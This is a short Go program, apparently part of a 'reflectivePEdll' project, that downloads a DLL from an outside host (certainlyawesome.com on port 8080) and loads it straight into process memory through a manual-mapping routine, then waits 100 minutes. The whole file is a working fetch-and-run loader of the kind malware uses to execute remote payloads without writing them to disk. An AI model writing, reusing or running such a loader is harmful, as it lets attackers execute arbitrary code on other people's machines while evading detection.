package main

import (
	"io"
	"log"
	"net/http"
	"os"
	"reflectivePEdll/pkg/manualmap"
	"time"
)

func loadDll(pid int) error {

	resp, err := http.Get("http://certainlyawesome.com:8080/toaster")
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	dll, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	return manualmap.MemoryLoadLibrary(dll, pid)
}

func main() {

	pid := os.Getpid()

	log.Println("Starting load...")

	log.Println(loadDll(pid))

	time.Sleep(100 * time.Minute)
}
